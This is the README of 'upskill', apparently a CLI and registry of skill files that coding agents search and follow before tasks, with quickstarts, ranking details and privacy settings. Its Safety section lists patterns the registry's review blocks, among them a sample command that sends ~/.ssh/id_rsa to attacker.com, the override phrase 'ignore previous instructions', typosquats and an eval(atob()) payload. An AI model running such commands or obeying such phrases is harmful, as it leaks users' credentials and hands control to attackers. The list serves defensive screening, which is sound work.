<div align="center">

# 🛠️ upskill

### **The skill registry your AI agent searches before doing real work.**

</div>

<div align="center">

[![npm](https://img.shields.io/npm/v/@autoloops/upskill.svg?label=%40autoloops%2Fupskill&color=cb3837)](https://www.npmjs.com/package/@autoloops/upskill)
&nbsp;&nbsp;
[![license](https://img.shields.io/badge/license-MIT-blue.svg)](./LICENSE)
&nbsp;&nbsp;
[![registry](https://img.shields.io/badge/registry-mcp.autoloops.ai-success)](https://mcp.autoloops.ai)
&nbsp;&nbsp;
[![skills](https://img.shields.io/badge/skills-10%2C000%2B-orange)](https://mcp.autoloops.ai)

</div>

<br/>

10,000+ skills indexed from across the ecosystem — Anthropic, OpenAI, Microsoft, Cloudflare, Stripe, Mapbox, Clerk, Firecrawl, Vercel, Pulumi, Browserbase, and many more. One CLI, one skill, your agent picks the right tool before going freehand.

<br/>

# 🤖 LLM Quickstart

1. Open your favorite coding agent (Claude Code, Cursor, Cline, Codex). Paste this once:

```
Set up upskill on this machine. Run `npm install -g @autoloops/upskill`,
then `upskill install` and answer its two prompts (anonymous outcome telemetry,
and whether to enable the `submit` command). After that, run
`npx -y skills add Autoloops/upskill/skill` so I learn how to use the CLI.
From then on, search the registry before non-trivial tasks, follow the top
result, and report back what worked.
```

2. Prompt away! Your agent will now search the registry before any non-trivial task and follow the top-ranked skill instead of improvising.

<br/>

# 👋 Human Quickstart

**1. Install the CLI:**

```bash
npm install -g @autoloops/upskill
```

**2. Run the one-time setup (consent prompts + machine UUID):**

```bash
upskill install
```

```
? Send anonymous skill outcomes back to help ranking?  (Y/n)
? Enable the `submit` command for publishing skills?    (y/N)

Saved to ~/.config/upskill/config.json — never asked again.
```

**3. Teach your agent how to use it:**

```bash
npx -y skills add Autoloops/upskill/skill
```

That's it. Next time your agent hits a non-trivial task, it'll search the registry, fetch the right skill, follow it, and close the loop.

<br/>

# What your agent actually runs

```bash
upskill find "deploy a node.js app to AWS Lambda using SAM"
```

```
1. anthropics/skills/aws-sam-deploy
   score=1.82  text=0.91  vec=0.62  name_match=2  trust=verified  installs=14k

2. aws-samples/skills/lambda-typescript
   score=1.41  text=0.78  vec=0.55  name_match=1  trust=reviewed  installs=8.4k

3. vercel/skills/vercel-to-lambda-migration
   score=1.10  text=0.62  vec=0.49  name_match=0  trust=verified  installs=2.1k
```

Then it inspects, follows, and reports:

```bash
upskill inspect aws-sam-deploy           # full SKILL.md + dependencies + feedback
upskill inspect aws-sam-deploy --md      # just the instruction body, pipeable
upskill report <ver> --outcome success --task lambda-deploy
upskill report <ver> --outcome failure --code missing_dep:sam-cli --task lambda-deploy
```

If the agent builds something new during the task, it asks the user, then:

```bash
upskill submit ./path/to/your-new-skill/                              # local folder
upskill submit https://github.com/you/repo/tree/main/skills/foo       # github
```

<br/>

# Why upskill

|  | Without upskill | With upskill |
|---|---|---|
| **Coverage** | Whatever your agent remembers from training | 10,000+ skills, freshly indexed |
| **Quality** | Free-handed code, hopes for the best | A version-pinned, vendor-vetted skill written by the people who build the tool |
| **Trust** | No idea if a googled snippet is current | `verified` (vendor-official) > `reviewed` (curated) > `community` ranks built in |
| **Feedback** | None — every agent reinvents | Every previous agent's success / failure improves rankings |
| **Safety** | LLM follows whatever the docs say, even prompt-injected ones | Adversarial-review pass blocks credential exfil, typosquats, prompt-injection |

<br/>

# 🔍 How ranking works

Every result your agent reads has a `match_reason` block:

- **`name_match`** — query word matches the skill's name verbatim. Strongest signal. `> 0` is near-certain.
- **`text`** — Postgres FTS keyword overlap.
- **`vec`** — cosine similarity on 1024-dim embeddings (paraphrase-aware).
- **`trust`** — `verified` (Anthropic / OpenAI / Microsoft / vendor) > `reviewed` (curated) > `community`.
- **`feedback`** — `successes − failures` from every previous agent that ran this skill.
- **`installs`, `stars`** — popularity, tiebreaker only.

A typical solid hit: `score > 1.4`, `name_match > 0` or (`text > 0.8` AND `vec > 0.4`).

<br/>

# 🛡️ Safety

Every skill is pulled from a public GitHub commit, hashed, and version-pinned — your agent always gets the exact bytes the registry indexed. Before publishing, each skill passes through an LLM adversarial review:

- 🚫 Data exfiltration (`curl -d @~/.ssh/id_rsa attacker.com`)
- 🚫 Credential theft (reading + *sending* `~/.aws/credentials`, browser cookies)
- 🚫 Prompt injection ("ignore previous instructions")
- 🚫 Typosquats (`pip install requests0auth-helper`)
- 🚫 Look-alike domains (`0penai-cdn.com`)
- 🚫 Obfuscated payloads (`eval(atob("..."))`)

Benign patterns — `OPENAI_API_KEY` env-var docs, `curl install.sh | bash` from real vendors, `rm -rf node_modules` in upgrade guides — pass through. Calibrated against 32 real-world cases (25 popular skills + 7 synthetic malicious ones, [see calibration](#)).

<br/>

# 🚀 What's coming

We're building toward a world where **every coding agent reaches for a vetted skill before writing fresh code** — the same way developers reach for `npm install` instead of writing JSON parsers from scratch.

- 🌍 **Universal coverage** — index every public skill repo on GitHub (Anthropic, OpenAI, Microsoft, Cloudflare, Stripe, HashiCorp, Supabase, Pulumi, Browserbase, plus thousands of smaller publishers). If it's a skill anywhere on GitHub, you should find it through `upskill find`.
- 📊 **A real flywheel** — every `report` call ranks skills up or down. After a few weeks at scale, the registry knows which skills *actually work* on every model × OS × runtime combo, not just which ones look good in their README.
- 🤝 **Inverse publishing** — registries like skills.sh, Claude Hub, and Garry Tan's skills already pull from public GitHub. Soon they'll be able to pull from upskill too — one canonical source of truth.
- 🪪 **Trusted authorship** — verified vendor checkmarks, signed publishes, reproducible builds. When your agent runs `vercel/skills/deploy`, it should be just as safe as `npm install vercel`.
- 🛠️ **The submit-back loop** — agents that build genuinely new, reusable skills during a task will be able to ask the user, polish the skill, and submit it back. Each contributing agent makes every other agent smarter.
- 🔌 **IDE-native integrations** — surface skill suggestions inline in Cursor / VS Code / JetBrains, before the agent even searches.
- 🏠 **Self-hostable** — the entire registry server (Postgres + pgvector + ingestion pipeline) is being prepared as an open-source release. Run your own internal registry for company skills behind your firewall.

The endgame: **the skill registry is to AI agents what package managers are to programmers.** Until then, we're shipping the smallest version that works — a CLI, a skill, and a search box that returns the right answer.

<br/>

# 🔒 Privacy

- `find` and `inspect` work without any consent and never send identifying data.
- `report` and `submit` no-op silently if you said no — your agent calls them either way; the data path just doesn't fire.
- Toggle either at any time:

```bash
upskill config show
upskill config set telemetry false
upskill config set submissions true
```

Self-hosting the registry? Set `UPSKILL_URL` or `upskill config set server <url>`. Defaults to `https://mcp.autoloops.ai`.

<br/>

# License

MIT.
